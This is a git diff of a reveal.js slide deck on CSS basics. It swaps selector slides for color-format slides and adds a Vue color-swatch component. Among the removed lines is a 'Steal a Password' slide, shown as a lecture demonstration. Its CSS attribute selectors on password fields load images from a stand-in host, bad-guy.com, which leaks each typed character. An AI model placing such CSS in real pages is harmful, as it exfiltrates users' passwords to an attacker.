@@ -26,12 +26,12 @@
   </head>
   <body>
     <div class="reveal">
-      <div class="slides">
+      <div class="slides" id="vue">
         <section>
           <h1>Little Known <br />CSS Basics <em>Colors</em></h1>
         </section>
 
-        <section data-background="https://jdsteinbach.com/css-basics-selectors/images/bubblewrap.jpg">
+        <section data-background="">
           <h1><em>Colors</em> There’s More than Meets the Eye</h1>
         </section>
 
@@ -43,291 +43,82 @@
           <section>
             <h3>Named Colors</h3>
             <div class="striped">
-              <div class="fragment" style="--bgc:dodgerblue">dodgerblue</div>
-              <div class="fragment" style="--bgc:slategray">slategray</div>
-              <div class="light fragment" style="--bgc:seashell">seashell</div>
-              <div class="fragment" style="--bgc:darkgoldenrod">darkgoldenrod</div>
-              <div class="fragment" style="--bgc:red">red</div>
-              <div class="fragment" style="--bgc:rebeccapurple">rebeccapurple</div>
+              <Color color="dodgerblue"></Color>
+              <Color color="slategray"></Color>
+              <Color class="light" color="seashell"></Color>
+              <Color color="darkgoldenrod"></Color>
+              <Color color="red"></Color>
+              <Color color="rebeccapurple"></Color>
             </div>
           </section>
 
           <section>
-            <h3>RGB(A)</h3>
-            <div class="striped">
-              <div class="fragment" style="--bgc:rgb(130,119,23)">rgb(130,119,23)</div>
-              <div class="light fragment" style="--bgc:rgb(179,229,252)">rgb(179,229,252)</div>
-              <div class="fragment" style="--bgc:rgb(173,20,87)">rgb(173,20,87)</div>
-              <div class="fragment" style="--bgc:rgba(239,108,0,.5)">rgba(239,108,0,.5)</div>
-              <div class="fragment" style="--bgc:rgba(96,125,139,.7)">rgba(96,125,139,.7)</div>
-              <div class="fragment" style="--bgc:rgb(97,47,47)">rgb(97,47,47)</div>
+            <h3>RGB</h3>
+            <p class="fragment">Red, green, &amp; blue values (0-255)</p>
+            <div class="fragment striped">
+              <Color color="rgb(96,86,156)">rgb(96,86,156)</Color>
+              <Color color="rgb(92,100,67)">rgb(92,100,67)</Color>
+              <Color class="light" color="rgb(218,201,53)">rgb(218,201,53)</Color>
+            </div>
+          </section>
+
+          <section>
+            <h3>RGBA</h3>
+            <p class="fragment">RGB (0-255), alpha transparency (0-1)</p>
+            <div class="fragment striped">
+              <Color color="rgb(96,86,156,.3)">rgb(96,86,156,.3)</Color>
+              <Color color="rgb(92,100,67,.5)">rgb(92,100,67,.5)</Color>
+              <Color class="light" color="rgb(218,201,53,.8)">rgb(218,201,53,.8)</Color>
             </div>
           </section>
 
           <section>
             <h3>Hexadecimal</h3>
-            <div class="striped">
-              <div class="fragment" style="--bgc:#B71C1C">#B71C1C</div>
-              <div class="fragment" style="--bgc:#3949AB">#3949AB</div>
-              <div class="light fragment" style="--bgc:#FFE082">#FFE082</div>
-              <div class="fragment" style="--bgc:#616161">#616161</div>
-              <div class="light fragment" style="--bgc:#CE93D8">#CE93D8</div>
-              <div class="fragment" style="--bgc:#00897B">#00897B</div>
+            <p class="fragment">Also red, green, blue values,<br /> but ranges from <code>00</code>&ndash;<code>ff</code></p>
+            <p class="fragment">3 / 6 digit: <code>#000</code> = <code>#000000</code></p>
+            <div class="fragment striped">
+              <Color color="#60569c">#60569c</Color>
+              <Color color="#5c6443">#5c6443</Color>
+              <Color class="light" color="#dac935">#dac935</Color>
+              <Color class="light" color="#ebecf0">#ebecf0</Color>
+              <Color color="#2c313e">#2c313e</Color>
             </div>
           </section>
 
           <section>
-            <h3>RGB(A)</h3>
-            <div class="striped">
-              <div class="fragment" style="--bgc:dodgerblue">dodgerblue</div>
-              <div class="fragment" style="--bgc:slategray">slategray</div>
-              <div class="light fragment" style="--bgc:seashell">seashell</div>
-              <div class="fragment" style="--bgc:darkgoldenrod">darkgoldenrod</div>
-              <div class="fragment" style="--bgc:red">red</div>
-              <div class="fragment" style="--bgc:rebeccapurple">rebeccapurple</div>
+            <h3>Hexadecimal+</h3>
+            <p class="fragment"><b>Future CSS:</b> alpha transparency<br />4 / 8 digit:<code>#000a</code> = <code>#000000aa</code></p>
+            <div class="fragment striped">
+              <Color color="#60569c4c">#60569c4c</Color>
+              <Color color="#5c64437f">#5c64437f</Color>
+              <Color class="light" color="#dac935cc">#dac935cc</Color>
             </div>
           </section>
 
-        </section>
-
-        <section>
           <section>
-            <h2>Why Do Some Selectors Override Others?</h2>
+            <h3>HSL</h3>
+            <p class="fragment">Hue (0-360), saturation (0-100%), &amp; lightness (0-100%)</p>
+            <div class="fragment striped">
+              <Color color="hsl(249,29%,47%)">hsl(249,29%,47%)</Color>
+              <Color color="hsl(75,20%,33%)">hsl(75,20%,33%)</Color>
+              <Color class="light" color="hsl(54,69%,53%)">hsl(54,69%,53%)</Color>
+            </div>
           </section>
 
           <section>
-            <h3>Specificity!</h3>
+            <h3>HSLA</h3>
+            <p class="fragment">HSL + alpha transparency (0-1)</p>
+            <div class="fragment striped">
+              <Color color="rgb(96,86,156,.3)">rgb(96,86,156,.3)</Color>
+              <Color color="rgb(92,100,67,.5)">rgb(92,100,67,.5)</Color>
+              <Color class="light" color="rgb(218,201,53,.8)">rgb(218,201,53,.8)</Color>
+            </div>
           </section>
 
           <section>
-            <h3>Specificity: TL;DR</h3>
-            <ul>
-              <li class="fragment"><code>*</code></li>
-              <li class="fragment">HTML tags, pseudo-elements</li>
-              <li class="fragment"><code>.class</code>, <code>[attribute]</code>, pseudo-classes</li>
-              <li class="fragment"><code>#id</code></li>
-            </ul>
-          </section>
-
-          <section>
-            <h3>But also&hellip;</h3>
-            <p class="fragment"><code>.compound.selectors</code></p>
-            <p class="fragment"><code>.complex .selectors</code></p>
-          </section>
-
-          <section>
-            <h3>Calculating Specificity</h3>
-            <table>
-              <thead>
-                <tr>
-                  <th>Inline</th>
-                  <th>ID</th>
-                  <th>Class <br />Attribute <br />Ps-Class</th>
-                  <th>Tag <br />Ps-Element</th>
-                </tr>
-                <tbody>
-                  <tr>
-                    <td>1</td>
-                    <td>1</td>
-                    <td>1</td>
-                    <td>1</td>
-                  </tr>
-                </tbody>
-              </thead>
-            </table>
-          </section>
-
-          <section>
-            <h3>Calculating Specificity</h3>
-            <ul>
-              <li class="fragment"><code>*</code>: <code>0,0,0,0</code></li>
-              <li class="fragment">Tag: <code>0,0,0,1</code></li>
-              <li class="fragment">Class: <code>0,0,1,0</code></li>
-              <li class="fragment">ID: <code>0,1,0,0</code></li>
-              <li class="fragment">Inline: <code>1,0,0,0</code></li>
-            </ul>
-          </section>
-
-          <section>
-            <h3>Blow It All Away</h3>
-            <p class="fragment">
-              <code>!important</code>
-              <p class="fragment">Only if you <i>really</i> know what you&apos;re doing&hellip;</p>
-            </p>
-          </section>
-        </section>
-
-        <section>
-          <section>
-            <h2>How Can I Combine Selectors?</h2>
-          </section>
-
-          <section>
-            <h3>Compound</h3>
-            <p class="fragment">Finds a single element that matches all conditions of the selector</p>
-            <p class="fragment"><code>a.link:hover</code></p>
-            <p class="fragment">Specificity: <code>0,0,2,1</code></p>
-          </section>
-
-          <section>
-            <h3>Descendant</h3>
-            <p class="fragment">Finds any matching element in the parent, no matter how deeply nested</p>
-            <p class="fragment"><code>.post-body ul</code></p>
-            <p class="fragment">Specificity: <code>0,0,1,1</code></p>
-          </section>
-
-          <section>
-            <h3>Child: <code>&gt;</code></h3>
-            <p class="fragment">Finds any matching element nested one level deep inside the parent</p>
-            <p class="fragment"><code>#mobile-nav > a</code></p>
-            <p class="fragment">Specificity: <code>0,1,0,1</code></p>
-          </section>
-
-          <section>
-            <h3>Adjacent Sibling: <code>+</code></h3>
-            <p class="fragment">Finds a matching sibling element immediately after the first element</p>
-            <p class="fragment"><code>.site-header + main</code></p>
-            <p class="fragment">Specificity: <code>0,0,1,1</code></p>
-          </section>
-
-          <section>
-            <h3>General Sibling: <code>~</code></h3>
-            <p class="fragment">Finds any matching sibling after the first element</p>
-            <p class="fragment"><code>h1 ~ p</code></p>
-            <p class="fragment">Specificity: <code>0,0,0,2</code></p>
-          </section>
-        </section>
-
-        <section>
-          <section>
-            <h2>Can I Use a Selector to Get Specific ELements in a Group?</h2>
-          </section>
-
-          <section>
-            <h3>For sure!</h3>
-            <ul>
-              <li class="fragment"><code>:first-child</code></li>
-              <li class="fragment"><code>:nth-child(2)</code></li>
-              <li class="fragment"><code>:last-child</code></li>
-              <li class="fragment"><code>:nth-last-child(odd)</code></li>
-            </ul>
-          </section>
-
-          <section>
-            <h3>For sure!</h3>
-            <ul>
-              <li class="fragment"><code>:first-of-type</code></li>
-              <li class="fragment"><code>:nth-of-type(4n)</code></li>
-              <li class="fragment"><code>:last-of-type</code></li>
-              <li class="fragment"><code>:nth-last-of-type(-n+3)</code></li>
-            </ul>
-          </section>
-
-          <section>
-            <h3>Use Cases</h3>
-            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/JpxOdb" rel="noreferrer noopener nofollow" target="_blank">Margins inside Padded Containers</a></p>
-            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/yvZPYm" rel="noreferrer noopener nofollow" target="_blank">Style Table Columns &amp; Rows</a></p>
-            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/EQrbNg" rel="noreferrer noopener nofollow" target="_blank">Style a Drop Cap in an Article's First Paragraph</a></p>
-          </section>
-        </section>
-
-        <section>
-          <section>
-            <h2>Are There Selectors for Styling Different Interactive States?</h2>
-          </section>
-
-          <section>
-            <h3>You betcha!</h3>
-            <ul>
-              <li class="fragment"><code>:hover</code></li>
-              <li class="fragment"><code>:active</code></li>
-              <li class="fragment"><code>:focus</code></li>
-              <li class="fragment"><code>:link</code></li>
-              <li class="fragment"><code>:visited</code></li>
-            </ul>
-          </section>
-
-          <section>
-            <h3>You betcha!</h3>
-            <ul>
-              <li class="fragment"><code>:target</code></li>
-              <li class="fragment"><code>:checked</code></li>
-              <li class="fragment"><code>:disabled</code></li>
-              <li class="fragment"><code>:invalid</code></li>
-              <li class="fragment"><code>:valid</code></li>
-            </ul>
-          </section>
-
-          <section>
-            <h3>Use Cases</h3>
-            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/zRePPo" rel="noreferrer noopener nofollow" target="_blank">Custom Focus Style for Keyboard Nav</a></p>
-            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/BYMmOE" rel="noreferrer noopener nofollow" target="_blank">Highlight Targeted Element</a></p>
-            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/KQJZwM" rel="noreferrer noopener nofollow" target="_blank">HTML5 Form Validation</a></p>
-          </section>
-        </section>
-
-        <section>
-          <section>
-            <h2>Can I Use a <code>regex</code> selector to find things?</h2>
-          </section>
-
-          <section>
-            <h3>Kind of.</h3>
-            <ul>
-              <li class="fragment">Strict match: <code>[attr="string"]</code></li>
-              <li class="fragment">Begins with: <code>[attr^="string"]</code></li>
-              <li class="fragment">Ends with: <code>[attr$="string"]</code></li>
-              <li class="fragment">Contains anywhere: <code>[attr*="string"]</code></li>
-            </ul>
-          </section>
-
-          <section>
-            <h3>Kind of.</h3>
-            <ul>
-              <li class="fragment">Contains in a space-separated list: <code>[attr~="string"]</code></li>
-              <li class="fragment">Contains value or value followed by <code>-</code>: <code>[attr|="string"]</code></li>
-              <li class="fragment">Case insensitive match: <code>[attr*="String" i]</code></li>
-            </ul>
-          </section>
-
-          <section>
-            <h3>Use Cases</h3>
-            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/gvqoWY" rel="noreferrer noopener nofollow" target="_blank">Download Icons for File Types</a></p>
-            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/rJPpzp" rel="noreferrer noopener nofollow" target="_blank">Debug Inaccessible Images</a></p>
-            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/PQVEQq" rel="noreferrer noopener nofollow" target="_blank">Style Internal/External Links Differently</a></p>
-          </section>
-        </section>
-
-        <section>
-          <section>
-            <h2><em>Ok, Impress Me!</em> How Complicated Can Selectors <i>Really</i> Get?</h2>
-          </section>
-
-          <section>
-            <h3>Find the Number of Elements in a Container</h3>
-            <pre data-trim data-escape><code class="css">.nav-item:first-child:nth-last-child(4) {
-  &,
-  & ~ * {
-    /*
-     * Styles for when there are
-     * 4 nav-items
-     */
-  }
-}</code></pre>
-            <p><a href="https://codepen.io/jdsteinbach/pen/wyNpQo" rel="noreferrer noopener nofollow" target="_blank">Codepen</a></p>
-          </section>
-
-          <section>
-            <h3>Steal a Password</h3>
-            <pre data-trim data-escape><code class="css">[type="password"][value$="a"] {
-  background-image:
-    url("https://bad-guy.com/password/a");
-}
-
-[type="password"][value$="b"] {
-  background-image:
-    url("https://bad-guy.com/password/b");
-}</code></pre>
+            <h3><code>currentColor</code></h3>
+            <p class="fragment">The OG CSS variable</p>
+            <p class="fragment"><code>currentColor</code> = the CSS <code>color</code> applied to the selected element</p>
           </section>
         </section>
 
@@ -344,6 +135,8 @@
 
 
     <script src="lib/js/head.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tinycolor/1.4.1/tinycolor.min.js"></script>
     <script src="js/reveal.js"></script>
 
     <script>
@@ -363,6 +156,30 @@
           { src: 'plugin/zoom-js/zoom.js', async: true }
         ]
       });
+    </script>
+    <script>
+      Vue.component('Color', {
+        props: {
+          color: {
+            default: 'red'
+          }
+        },
+        computed: {
+          colorStyle: function() {
+            return 'background:' + this.color;
+          },
+          customClass: function() {
+            var classNames = ['color-component'];
+            if (tinycolor(this.color).isLight()) {
+              classNames.push('light');
+            }
+            return classNames.join(' ');
+          }
+        },
+        template: '<input v-bind:class="customClass" v-bind:style="colorStyle" v-model="color" />'
+      });
+
+      new Vue({el: '#vue'});
     </script>
   </body>
 </html>
